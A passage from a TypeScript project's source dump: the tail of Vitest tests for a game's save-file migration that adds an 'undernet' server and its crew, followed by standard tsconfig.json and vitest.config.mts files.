    expect(again.characters.length).toBe(n + 5);
    expect(again.servers.filter((x) => x.id === UNDERNET_ID).length).toBe(1);
  });
  it("a current-version save missing the server still gets it on load", () => {
    const w = world("v6half") as WorldState;
    const crew = { ...w.undernet!.crew };
    strip(w);
    const n = w.characters.length;
    const m = migrateWorld(w)!;
    expect(m.servers.some((x) => x.id === UNDERNET_ID)).toBe(true);
    expect(m.characters.length).toBe(n); // reuses the existing crew
    expect(m.undernet!.crew).toEqual(crew);
    expect(m.characters[Number(crew.gh0st.slice(1))].servers).toContain(UNDERNET_ID);
  });
  it("a fresh world does not show the tip", () => {
    expect((world("fresh-tip") as WorldState).undernet!.announce).toBeUndefined();
  });
});

```

## tsconfig.json
```json
{
  "compilerOptions": {
    "target": "ES2017",
    "lib": ["dom", "dom.iterable", "esnext"],
    "allowJs": true,
    "skipLibCheck": true,
    "strict": true,
    "noEmit": true,
    "esModuleInterop": true,
    "module": "esnext",
    "moduleResolution": "bundler",
    "resolveJsonModule": true,
    "isolatedModules": true,
    "jsx": "react-jsx",
    "incremental": true,
    "plugins": [
      {
        "name": "next"
      }
    ],
    "paths": {
      "@/*": ["./src/*"]
    }
  },
  "include": [
    "next-env.d.ts",
    "**/*.ts",
    "**/*.tsx",
    ".next/types/**/*.ts",
    ".next/dev/types/**/*.ts",
    "**/*.mts"
  ],
  "exclude": ["node_modules"]
}

```

## vitest.config.mts
```mts
import { defineConfig } from "vitest/config";
import path from "node:path";

export default defineConfig({
  resolve: { alias: { "@": path.resolve(import.meta.dirname, "src") } },
  test: { environment: "node", include: process.env.BENCH ? ["bench/**/*.test.ts"] : ["tests/**/*.test.ts"] },
});

```
